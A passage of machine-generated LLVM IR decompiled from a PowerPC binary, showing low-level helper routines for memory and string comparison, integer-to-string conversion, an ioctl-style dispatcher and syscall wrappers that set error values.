  br i1 %v4_1000b000, label %dec_label_pc_1000b018, label %dec_label_pc_1000b010

dec_label_pc_1000b010:                            ; preds = %dec_label_pc_1000b01c, %dec_label_pc_1000b000
  ret i32 0

dec_label_pc_1000b018:                            ; preds = %dec_label_pc_1000b000
  %v2_1000b018 = icmp eq i32 %v0_1000b000, 0
  br i1 %v2_1000b018, label %dec_label_pc_1000b038, label %dec_label_pc_1000b01c

dec_label_pc_1000b01c:                            ; preds = %dec_label_pc_1000b018, %dec_label_pc_1000b034
  %v0_1000b034 = phi i32 [ %v1_1000b034, %dec_label_pc_1000b034 ], [ %v0_1000b000, %dec_label_pc_1000b018 ]
  %v0_1000b024 = phi i32 [ %v1_1000b028, %dec_label_pc_1000b034 ], [ %arg2, %dec_label_pc_1000b018 ]
  %v0_1000b01c = phi i32 [ %v1_1000b020, %dec_label_pc_1000b034 ], [ %tmp, %dec_label_pc_1000b018 ]
  %v1_1000b01c = inttoptr i32 %v0_1000b01c to i8*
  %v2_1000b01c = load i8, i8* %v1_1000b01c, align 1
  %v1_1000b024 = inttoptr i32 %v0_1000b024 to i8*
  %v2_1000b024 = load i8, i8* %v1_1000b024, align 1
  %v4_1000b02c = icmp eq i8 %v2_1000b01c, %v2_1000b024
  br i1 %v4_1000b02c, label %dec_label_pc_1000b034, label %dec_label_pc_1000b010

dec_label_pc_1000b034:                            ; preds = %dec_label_pc_1000b01c
  %v1_1000b028 = add i32 %v0_1000b024, 1
  %v1_1000b020 = add i32 %v0_1000b01c, 1
  %v1_1000b034 = add i32 %v0_1000b034, -1
  %v2_1000b034 = icmp eq i32 %v1_1000b034, 0
  br i1 %v2_1000b034, label %dec_label_pc_1000b038, label %dec_label_pc_1000b01c

dec_label_pc_1000b038:                            ; preds = %dec_label_pc_1000b034, %dec_label_pc_1000b018
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_1000b034, { 1, 0 }
  uselistorder i32 %v0_1000b01c, { 1, 0 }
  uselistorder i32 %v0_1000b024, { 1, 0 }
  uselistorder label %dec_label_pc_1000b01c, { 1, 0 }
  uselistorder label %dec_label_pc_1000aff0, { 1, 0 }
  uselistorder label %dec_label_pc_1000afd0, { 1, 0 }
}

define i32 @function_1000b040(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000b040:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_1000b040 = load i8, i8* %arg1, align 1
  %v3_1000b048 = icmp eq i8 %v2_1000b040, 0
  br i1 %v3_1000b048, label %dec_label_pc_1000b060, label %dec_label_pc_1000b050

dec_label_pc_1000b050:                            ; preds = %dec_label_pc_1000b040, %dec_label_pc_1000b050
  %v0_1000b050 = phi i32 [ %v1_1000b050, %dec_label_pc_1000b050 ], [ 0, %dec_label_pc_1000b040 ]
  %v1_1000b050 = add i32 %v0_1000b050, 1
  %v2_1000b054 = add i32 %v1_1000b050, %tmp
  %v3_1000b054 = inttoptr i32 %v2_1000b054 to i8*
  %v4_1000b054 = load i8, i8* %v3_1000b054, align 1
  %v3_1000b058 = icmp eq i8 %v4_1000b054, 0
  br i1 %v3_1000b058, label %dec_label_pc_1000b060, label %dec_label_pc_1000b050

dec_label_pc_1000b060:                            ; preds = %dec_label_pc_1000b050, %dec_label_pc_1000b040
  %v1_1000b080 = phi i32 [ 0, %dec_label_pc_1000b040 ], [ %v1_1000b050, %dec_label_pc_1000b050 ]
  %v1_1000b060 = inttoptr i32 %arg2 to i8*
  %v2_1000b060 = load i8, i8* %v1_1000b060, align 1
  %v3_1000b068 = icmp eq i8 %v2_1000b060, 0
  br i1 %v3_1000b068, label %dec_label_pc_1000b080, label %dec_label_pc_1000b070

dec_label_pc_1000b070:                            ; preds = %dec_label_pc_1000b060, %dec_label_pc_1000b070
  %v0_1000b070 = phi i32 [ %v1_1000b070, %dec_label_pc_1000b070 ], [ 0, %dec_label_pc_1000b060 ]
  %v1_1000b070 = add i32 %v0_1000b070, 1
  %v2_1000b074 = add i32 %v1_1000b070, %arg2
  %v3_1000b074 = inttoptr i32 %v2_1000b074 to i8*
  %v4_1000b074 = load i8, i8* %v3_1000b074, align 1
  %v3_1000b078 = icmp eq i8 %v4_1000b074, 0
  br i1 %v3_1000b078, label %dec_label_pc_1000b080, label %dec_label_pc_1000b070

dec_label_pc_1000b080:                            ; preds = %dec_label_pc_1000b070, %dec_label_pc_1000b060
  %v1_1000b088 = phi i32 [ 0, %dec_label_pc_1000b060 ], [ %v1_1000b070, %dec_label_pc_1000b070 ]
  %v3_1000b080 = icmp slt i32 %v1_1000b080, %arg3
  br i1 %v3_1000b080, label %dec_label_pc_1000b0b4, label %dec_label_pc_1000b088

dec_label_pc_1000b088:                            ; preds = %dec_label_pc_1000b080
  %v3_1000b088 = icmp slt i32 %v1_1000b088, %arg3
  %v1_1000b08c = add i32 %arg3, 1
  br i1 %v3_1000b088, label %dec_label_pc_1000b0b4, label %dec_label_pc_1000b098

dec_label_pc_1000b098:                            ; preds = %dec_label_pc_1000b088, %dec_label_pc_1000b09c
  %v0_1000b0a4 = phi i32 [ %v1_1000b0a8, %dec_label_pc_1000b09c ], [ %arg2, %dec_label_pc_1000b088 ]
  %v0_1000b09c = phi i32 [ %v1_1000b0a0, %dec_label_pc_1000b09c ], [ %tmp, %dec_label_pc_1000b088 ]
  %v0_1000b098 = phi i32 [ %v1_1000b098, %dec_label_pc_1000b09c ], [ %v1_1000b08c, %dec_label_pc_1000b088 ]
  %v1_1000b098 = add i32 %v0_1000b098, -1
  %v2_1000b098 = icmp eq i32 %v1_1000b098, 0
  br i1 %v2_1000b098, label %dec_label_pc_1000b0bc, label %dec_label_pc_1000b09c

dec_label_pc_1000b09c:                            ; preds = %dec_label_pc_1000b098
  %v1_1000b09c = inttoptr i32 %v0_1000b09c to i8*
  %v2_1000b09c = load i8, i8* %v1_1000b09c, align 1
  %v1_1000b0a0 = add i32 %v0_1000b09c, 1
  %v1_1000b0a4 = inttoptr i32 %v0_1000b0a4 to i8*
  %v2_1000b0a4 = load i8, i8* %v1_1000b0a4, align 1
  %v1_1000b0a8 = add i32 %v0_1000b0a4, 1
  %v4_1000b0ac = icmp eq i8 %v2_1000b09c, %v2_1000b0a4
  br i1 %v4_1000b0ac, label %dec_label_pc_1000b098, label %dec_label_pc_1000b0b4

dec_label_pc_1000b0b4:                            ; preds = %dec_label_pc_1000b09c, %dec_label_pc_1000b088, %dec_label_pc_1000b080
  ret i32 0

dec_label_pc_1000b0bc:                            ; preds = %dec_label_pc_1000b098
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_1000b098, { 1, 0 }
  uselistorder i32 %v0_1000b09c, { 1, 0 }
  uselistorder i32 %v0_1000b0a4, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b098, { 1, 0 }
  uselistorder label %dec_label_pc_1000b070, { 1, 0 }
  uselistorder label %dec_label_pc_1000b050, { 1, 0 }
}

define i32 @function_1000b0c4(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000b0c4:
  %cr6_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to i8*
  store i32 %arg3, i32* @r5, align 4
  %tmp17 = sext i8 %arg1 to i32
  store i32 %tmp17, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000b0c4 = icmp eq i32 %arg3, 0
  %v4_1000b0c8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000b0c8, i32* %stack_var_-64, align 4
  %v5_1000b0c8 = ptrtoint i32* %stack_var_-64 to i32
  br i1 %v4_1000b0c4, label %dec_label_pc_1000b0e4, label %dec_label_pc_1000b0d0

dec_label_pc_1000b0d0:                            ; preds = %dec_label_pc_1000b0c4
  %v0_1000b0d0 = load i32, i32* %r3.global-to-local, align 4
  %v3_1000b0d0 = icmp eq i32 %v0_1000b0d0, 0
  store i1 %v3_1000b0d0, i1* %cr6_eq.global-to-local, align 1
  br i1 %v3_1000b0d0, label %dec_label_pc_1000b0d8, label %dec_label_pc_1000b0f0

dec_label_pc_1000b0d8:                            ; preds = %dec_label_pc_1000b0d0
  store i32 48, i32* %r0.global-to-local, align 4
  %v4_1000b0dc = add i32 %arg3, 1
  %v5_1000b0dc = inttoptr i32 %v4_1000b0dc to i8*
  store i8 0, i8* %v5_1000b0dc, align 1
  %v0_1000b0e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b0e0 = trunc i32 %v0_1000b0e0 to i8
  store i8 %v1_1000b0e0, i8* %tmp, align 1
  br label %dec_label_pc_1000b0e4

dec_label_pc_1000b0e4:                            ; preds = %dec_label_pc_1000b0c4, %dec_label_pc_1000b170, %dec_label_pc_1000b0d8
  store i32 %arg3, i32* %r3.global-to-local, align 4
  ret i32 %arg3

dec_label_pc_1000b0f0:                            ; preds = %dec_label_pc_1000b0d0
  %v2_1000b0d0 = icmp sgt i32 %v0_1000b0d0, 0
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_1000b0f0.not = icmp ne i32 %arg2, 10
  %brmerge = or i1 %v2_1000b0d0, %v3_1000b0f0.not
  br i1 %brmerge, label %dec_label_pc_1000b104, label %dec_label_pc_1000b1b8

dec_label_pc_1000b104:                            ; preds = %dec_label_pc_1000b0f0, %dec_label_pc_1000b1b8
  %v0_1000b1082 = phi i32 [ %v0_1000b0d0, %dec_label_pc_1000b0f0 ], [ %v1_1000b1b8, %dec_label_pc_1000b1b8 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_1000b0f0 ], [ 1, %dec_label_pc_1000b1b8 ]
  store i32 %storemerge, i32* %r8.global-to-local, align 4
  store i32 32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000b108

dec_label_pc_1000b108:                            ; preds = %dec_label_pc_1000b134.dec_label_pc_1000b108_crit_edge, %dec_label_pc_1000b104
  %v1_1000b10c = phi i32 [ %v1_1000b10c.pre, %dec_label_pc_1000b134.dec_label_pc_1000b108_crit_edge ], [ 32, %dec_label_pc_1000b104 ]
  %v0_1000b10c = phi i32 [ %v0_1000b10c.pre, %dec_label_pc_1000b134.dec_label_pc_1000b108_crit_edge ], [ %v5_1000b0c8, %dec_label_pc_1000b104 ]
  %v1_1000b11c = phi i32 [ %v0_1000b108.pre, %dec_label_pc_1000b134.dec_label_pc_1000b108_crit_edge ], [ %v0_1000b1082, %dec_label_pc_1000b104 ]
  %v2_1000b108 = udiv i32 %v1_1000b11c, %arg2
  %v2_1000b10c = add i32 %v0_1000b10c, %v1_1000b10c
  store i32 %v2_1000b10c, i32* %r11.global-to-local, align 4
  %v1_1000b110 = add i32 %v1_1000b10c, -1
  store i32 %v1_1000b110, i32* %r10.global-to-local, align 4
  %v2_1000b114 = mul i32 %v2_1000b108, %arg2
  %v3_1000b118 = icmp ult i32 %v1_1000b11c, %arg2
  store i1 %v3_1000b118, i1* %cr6_eq.global-to-local, align 1
  %v2_1000b11c = sub i32 %v1_1000b11c, %v2_1000b114
  store i32 %v2_1000b11c, i32* %r9.global-to-local, align 4
  store i32 %v2_1000b108, i32* %r3.global-to-local, align 4
  %tmp22 = icmp slt i32 %v2_1000b11c, 10
  %storemerge15.v = select i1 %tmp22, i32 48, i32 55
  %storemerge15 = add i32 %storemerge15.v, %v2_1000b11c
  %v0_1000b134.off0 = trunc i32 %storemerge15 to i8
  store i32 %storemerge15, i32* %r0.global-to-local, align 4
  %v3_1000b134 = add i32 %v2_1000b10c, 8
  %v4_1000b134 = inttoptr i32 %v3_1000b134 to i8*
  store i8 %v0_1000b134.off0, i8* %v4_1000b134, align 1
  %v0_1000b138 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_1000b138, label %dec_label_pc_1000b13c, label %dec_label_pc_1000b134.dec_label_pc_1000b108_crit_edge

dec_label_pc_1000b134.dec_label_pc_1000b108_crit_edge: ; preds = %dec_label_pc_1000b108
  %v0_1000b108.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_1000b10c.pre = load i32, i32* @r1, align 4
  %v1_1000b10c.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000b108

dec_label_pc_1000b13c:                            ; preds = %dec_label_pc_1000b108
  %v0_1000b13c = load i32, i32* %r8.global-to-local, align 4
  %v3_1000b13c = icmp eq i32 %v0_1000b13c, 0
  br i1 %v3_1000b13c, label %dec_label_pc_1000b144, label %dec_label_pc_1000b1a4

dec_label_pc_1000b144:                            ; preds = %dec_label_pc_1000b13c
  %v0_1000b144 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000b144 = add i32 %v0_1000b144, 1
  store i32 %v1_1000b144, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000b148

dec_label_pc_1000b148:                            ; preds = %dec_label_pc_1000b1a4, %dec_label_pc_1000b144
  %v1_1000b150 = phi i32 [ %v1_1000b14c.pre, %dec_label_pc_1000b1a4 ], [ %v1_1000b144, %dec_label_pc_1000b144 ]
  %v2_1000b148 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000b148, i32* %r9.global-to-local, align 4
  %v2_1000b14c = add i32 %v1_1000b150, %v2_1000b148
  %v3_1000b14c = inttoptr i32 %v2_1000b14c to i8*
  %v4_1000b14c = load i8, i8* %v3_1000b14c, align 1
  %v5_1000b14c = zext i8 %v4_1000b14c to i32
  store i32 %v5_1000b14c, i32* %r0.global-to-local, align 4
  store i32 %v2_1000b14c, i32* %r9.global-to-local, align 4
  %v3_1000b154 = icmp eq i8 %v4_1000b14c, 0
  br i1 %v3_1000b154, label %dec_label_pc_1000b1cc, label %dec_label_pc_1000b15c

dec_label_pc_1000b15c:                            ; preds = %dec_label_pc_1000b148
  store i32 0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000b160

dec_label_pc_1000b160:                            ; preds = %dec_label_pc_1000b160, %dec_label_pc_1000b15c
  %v0_1000b160 = phi i32 [ %v1_1000b160, %dec_label_pc_1000b160 ], [ 0, %dec_label_pc_1000b15c ]
  %v1_1000b160 = add i32 %v0_1000b160, 1
  store i32 %v1_1000b160, i32* %r10.global-to-local, align 4
  %v2_1000b164 = add i32 %v1_1000b160, %v2_1000b14c
  %v3_1000b164 = inttoptr i32 %v2_1000b164 to i8*
  %v4_1000b164 = load i8, i8* %v3_1000b164, align 1
  %v5_1000b164 = zext i8 %v4_1000b164 to i32
  store i32 %v5_1000b164, i32* %r0.global-to-local, align 4
  %v3_1000b168 = icmp eq i8 %v4_1000b164, 0
  br i1 %v3_1000b168, label %dec_label_pc_1000b170, label %dec_label_pc_1000b160

dec_label_pc_1000b170:                            ; preds = %dec_label_pc_1000b160
  %v3_1000b170 = icmp eq i32 %v1_1000b160, -1
  br i1 %v3_1000b170, label %dec_label_pc_1000b0e4, label %dec_label_pc_1000b178

dec_label_pc_1000b178:                            ; preds = %dec_label_pc_1000b170
  store i32 %arg3, i32* %r11.global-to-local, align 4
  %phitmp = add i32 %v0_1000b160, 2
  br label %dec_label_pc_1000b17c

dec_label_pc_1000b17c:                            ; preds = %dec_label_pc_1000b1cc, %dec_label_pc_1000b178
  %v0_1000b17c = phi i32 [ 1, %dec_label_pc_1000b1cc ], [ %phitmp, %dec_label_pc_1000b178 ]
  store i32 %v0_1000b17c, i32* %r10.global-to-local, align 4
  store i32 %v0_1000b17c, i32* %ctr.global-to-local, align 4
  %v2_1000b18424 = load i8, i8* %v3_1000b14c, align 1
  %v3_1000b18425 = zext i8 %v2_1000b18424 to i32
  store i32 %v3_1000b18425, i32* %r0.global-to-local, align 4
  %v1_1000b18826 = add i32 %v2_1000b14c, 1
  store i32 %v1_1000b18826, i32* %r9.global-to-local, align 4
  store i8 %v2_1000b18424, i8* %tmp, align 1
  %v0_1000b19028 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b19029 = add i32 %v0_1000b19028, 1
  store i32 %v1_1000b19029, i32* %r11.global-to-local, align 4
  %v0_1000b19430 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b19431 = add i32 %v0_1000b19430, -1
  store i32 %v1_1000b19431, i32* %ctr.global-to-local, align 4
  %v2_1000b19432 = icmp eq i32 %v1_1000b19431, 0
  br i1 %v2_1000b19432, label %dec_label_pc_1000b198, label %dec_label_pc_1000b184.dec_label_pc_1000b184_crit_edge

dec_label_pc_1000b184.dec_label_pc_1000b184_crit_edge: ; preds = %dec_label_pc_1000b17c, %dec_label_pc_1000b184.dec_label_pc_1000b184_crit_edge
  %v1_1000b19033 = phi i32 [ %v1_1000b190, %dec_label_pc_1000b184.dec_label_pc_1000b184_crit_edge ], [ %v1_1000b19029, %dec_label_pc_1000b17c ]
  %v0_1000b184.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b184 = inttoptr i32 %v0_1000b184.pre to i8*
  %v2_1000b184 = load i8, i8* %v1_1000b184, align 1
  %v3_1000b184 = zext i8 %v2_1000b184 to i32
  store i32 %v3_1000b184, i32* %r0.global-to-local, align 4
  %v1_1000b188 = add i32 %v0_1000b184.pre, 1
  store i32 %v1_1000b188, i32* %r9.global-to-local, align 4
  %v3_1000b18c = inttoptr i32 %v1_1000b19033 to i8*
  store i8 %v2_1000b184, i8* %v3_1000b18c, align 1
  %v0_1000b190 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b190 = add i32 %v0_1000b190, 1
  store i32 %v1_1000b190, i32* %r11.global-to-local, align 4
  %v0_1000b194 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b194 = add i32 %v0_1000b194, -1
  store i32 %v1_1000b194, i32* %ctr.global-to-local, align 4
  %v2_1000b194 = icmp eq i32 %v1_1000b194, 0
  br i1 %v2_1000b194, label %dec_label_pc_1000b198, label %dec_label_pc_1000b184.dec_label_pc_1000b184_crit_edge

dec_label_pc_1000b198:                            ; preds = %dec_label_pc_1000b184.dec_label_pc_1000b184_crit_edge, %dec_label_pc_1000b17c
  store i32 %arg3, i32* %r3.global-to-local, align 4
  ret i32 %arg3

dec_label_pc_1000b1a4:                            ; preds = %dec_label_pc_1000b13c
  %v0_1000b1a4.pre = load i32, i32* @r1, align 4
  %v1_1000b1a4.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000b1a4 = add i32 %v1_1000b1a4.pre, %v0_1000b1a4.pre
  store i32 %v2_1000b1a4, i32* %r9.global-to-local, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v3_1000b1ac = add i32 %v2_1000b1a4, 8
  %v4_1000b1ac = inttoptr i32 %v3_1000b1ac to i8*
  store i8 45, i8* %v4_1000b1ac, align 1
  %v1_1000b14c.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000b148

dec_label_pc_1000b1b8:                            ; preds = %dec_label_pc_1000b0f0
  %v1_1000b1b8 = sub i32 0, %v0_1000b0d0
  store i32 %v1_1000b1b8, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000b104

dec_label_pc_1000b1cc:                            ; preds = %dec_label_pc_1000b148
  store i32 %arg3, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000b17c

; uselistorder directives
  uselistorder i32 %v1_1000b1b8, { 1, 0 }
  uselistorder i32 %v1_1000b194, { 1, 0 }
  uselistorder i32 %v1_1000b190, { 1, 0 }
  uselistorder i32 %v0_1000b17c, { 1, 0 }
  uselistorder i32 %v1_1000b160, { 0, 1, 3, 2 }
  uselistorder i32 %v2_1000b108, { 1, 0 }
  uselistorder i32 %v1_1000b11c, { 1, 0, 2 }
  uselistorder i32 %v1_1000b10c, { 1, 0 }
  uselistorder i32 %v0_1000b0d0, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 4, 3, 1, 5, 6, 0 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 2, 3, 4, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 2, 4, 3, 1, 5, 6, 0 }
  uselistorder i32* %r10.global-to-local, { 6, 7, 2, 0, 8, 9, 11, 10, 3, 1, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 4, 7, 8, 0, 1, 2, 3 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32 45, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 %arg3, { 1, 4, 5, 6, 2, 3, 0, 7, 9, 8 }
  uselistorder i32 %arg2, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_1000b184.dec_label_pc_1000b184_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000b104, { 1, 0 }
  uselistorder label %dec_label_pc_1000b0e4, { 1, 2, 0 }
}

define i32 @function_1000b1d8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000b1d8:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_1000b1e8 = icmp eq i32 %arg2, -2143521772
  %v2_1000b1fc = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000b1fc, i32* %stack_var_-32, align 4
  br i1 %v4_1000b1e8, label %dec_label_pc_1000b25c, label %dec_label_pc_1000b21c

dec_label_pc_1000b21c:                            ; preds = %dec_label_pc_1000b1d8
  %v3_1000b21c = icmp ugt i32 %arg2, -2143521772
  br i1 %v3_1000b21c, label %dec_label_pc_1000b234, label %dec_label_pc_1000b224

dec_label_pc_1000b224:                            ; preds = %dec_label_pc_1000b21c
  %v3_1000b228 = icmp eq i32 %arg2, 1077703699
  br i1 %v3_1000b228, label %dec_label_pc_1000b250, label %dec_label_pc_1000b27c

dec_label_pc_1000b234:                            ; preds = %dec_label_pc_1000b21c
  %v1_1000b234 = xor i32 %arg2, -2143551488
  %v3_1000b238 = icmp eq i32 %v1_1000b234, 29717
  br i1 %v3_1000b238, label %dec_label_pc_1000b26c, label %dec_label_pc_1000b240

dec_label_pc_1000b240:                            ; preds = %dec_label_pc_1000b234
  %v3_1000b244 = icmp eq i32 %v1_1000b234, 29718
  br i1 %v3_1000b244, label %dec_label_pc_1000b274, label %dec_label_pc_1000b27c

dec_label_pc_1000b250:                            ; preds = %dec_label_pc_1000b224
  store i32 ptrtoint (i32* @global_var_1000b258.484 to i32), i32* @lr, align 4
  %v2_1000b254 = inttoptr i32 %arg3 to i32*
  %v3_1000b254 = call i32 @function_1000bd20(i32* %v2_1000b254, i32 %arg1)
  br label %dec_label_pc_1000b264

dec_label_pc_1000b25c:                            ; preds = %dec_label_pc_1000b1d8
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1000b260

dec_label_pc_1000b260:                            ; preds = %dec_label_pc_1000b274, %dec_label_pc_1000b26c, %dec_label_pc_1000b25c
  store i32 268481124, i32* @lr, align 4
  %v0_1000b260 = call i32 @function_1000bdbc()
  br label %dec_label_pc_1000b264

dec_label_pc_1000b264:                            ; preds = %dec_label_pc_1000b250, %dec_label_pc_1000b260
  %storemerge = phi i32 [ %v0_1000b260, %dec_label_pc_1000b260 ], [ %v3_1000b254, %dec_label_pc_1000b250 ]
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b2a8

dec_label_pc_1000b26c:                            ; preds = %dec_label_pc_1000b234
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1000b260

dec_label_pc_1000b274:                            ; preds = %dec_label_pc_1000b240
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_1000b260

dec_label_pc_1000b27c:                            ; preds = %dec_label_pc_1000b240, %dec_label_pc_1000b224
  %v0_1000b28c = call i32 @__asm_mfcr()
  %v1_1000b290 = and i32 %v0_1000b28c, 268435456
  %v3_1000b290 = icmp eq i32 %v1_1000b290, 0
  store i32 %v0_1000b28c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b290, label %dec_label_pc_1000b2a8, label %dec_label_pc_1000b29c

dec_label_pc_1000b29c:                            ; preds = %dec_label_pc_1000b27c
  %v0_1000b29c = call i32 @function_1000bb0c()
  %v0_1000b2a0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b2a0 = inttoptr i32 %v0_1000b29c to i32*
  store i32 %v0_1000b2a0, i32* %v2_1000b2a0, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b2a8

dec_label_pc_1000b2a8:                            ; preds = %dec_label_pc_1000b27c, %dec_label_pc_1000b264, %dec_label_pc_1000b29c
  %v0_1000b2ac = phi i32 [ %v0_1000b28c, %dec_label_pc_1000b27c ], [ %storemerge, %dec_label_pc_1000b264 ], [ -1, %dec_label_pc_1000b29c ]
  ret i32 %v0_1000b2ac

; uselistorder directives
  uselistorder i32 %arg2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000b2a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b264, { 1, 0 }
}

define i32 @function_1000b2c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000b2c0:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_1000b2d4 = load i32, i32* @r4, align 4
  %v1_1000b2d4 = add i32 %v0_1000b2d4, -12
  %v2_1000b2d8 = icmp ugt i32 %v1_1000b2d4, 2
  %v2_1000b2e0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000b2e0, i32* %stack_var_-32, align 4
  br i1 %v2_1000b2d8, label %dec_label_pc_1000b30c, label %dec_label_pc_1000b2fc

dec_label_pc_1000b2fc:                            ; preds = %dec_label_pc_1000b2c0
  store i32 268481284, i32* @lr, align 4
  %v2_1000b300 = call i32 @function_1000b344(i32 3)
  store i32 %v2_1000b300, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b32c

dec_label_pc_1000b30c:                            ; preds = %dec_label_pc_1000b2c0
  %v0_1000b310 = call i32 @__asm_mfcr()
  %v1_1000b314 = and i32 %v0_1000b310, 268435456
  %v3_1000b314 = icmp eq i32 %v1_1000b314, 0
  store i32 %v0_1000b310, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b314, label %dec_label_pc_1000b32c, label %dec_label_pc_1000b320

dec_label_pc_1000b320:                            ; preds = %dec_label_pc_1000b30c
  %v0_1000b320 = call i32 @function_1000bb0c()
  %v0_1000b324 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b324 = inttoptr i32 %v0_1000b320 to i32*
  store i32 %v0_1000b324, i32* %v2_1000b324, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000b32c

dec_label_pc_1000b32c:                            ; preds = %dec_label_pc_1000b30c, %dec_label_pc_1000b2fc, %dec_label_pc_1000b320
  %v0_1000b330 = phi i32 [ %v0_1000b310, %dec_label_pc_1000b30c ], [ %v2_1000b300, %dec_label_pc_1000b2fc ], [ -1, %dec_label_pc_1000b320 ]
  ret i32 %v0_1000b330

; uselistorder directives
  uselistorder label %dec_label_pc_1000b32c, { 2, 0, 1 }
}

define i32 @function_1000b344(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000b344:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_1000b35c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000b35c, i32* %stack_var_-32, align 4
  %v0_1000b378 = call i32 @__asm_mfcr()
  %v1_1000b37c = and i32 %v0_1000b378, 268435456
  %v3_1000b37c = icmp eq i32 %v1_1000b37c, 0
  store i32 %v0_1000b378, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b37c, label %dec_label_pc_1000b394, label %dec_label_pc_1000b388

dec_label_pc_1000b388:                            ; preds = %dec_label_pc_1000b344
  %v0_1000b388 = call i32 @function_1000bb0c()
  %v0_1000b38c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b38c = inttoptr i32 %v0_1000b388 to i32*
  store i32 %v0_1000b38c, i32* %v2_1000b38c, align 4
  br label %dec_label_pc_1000b394

dec_label_pc_1000b394:                            ; preds = %dec_label_pc_1000b344, %dec_label_pc_1000b388
  %v0_1000b3a4 = phi i32 [ %v0_1000b378, %dec_label_pc_1000b344 ], [ -1, %dec_label_pc_1000b388 ]
  ret i32 %v0_1000b3a4

; uselistorder directives
  uselistorder label %dec_label_pc_1000b394, { 1, 0 }
}

define i32 @function_1000b3a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000b3a8:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000b3c0 = call i32 @__asm_mfcr()
  %v1_1000b3c4 = and i32 %v0_1000b3c0, 268435456
  %v3_1000b3c4 = icmp eq i32 %v1_1000b3c4, 0
  store i32 %v0_1000b3c0, i32* %r31.global-to-local, align 4
  br i1 %v3_1000b3c4, label %dec_label_pc_1000b3dc, label %dec_label_pc_1000b3d0

dec_label_pc_1000b3d0:                            ; preds = %dec_label_pc_1000b3a8
  %v0_1000b3d0 = call i32 @function_1000bb0c()
  %v0_1000b3d4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000b3d4 = inttoptr i32 %v0_1000b3d0 to i32*
  store i32 %v0_1000b3d4, i32* %v2_1000b3d4, align 4
  br label %dec_label_pc_1000b3dc

dec_label_pc_1000b3dc:                            ; preds = %dec_label_pc_1000b3a8, %dec_label_pc_1000b3d0
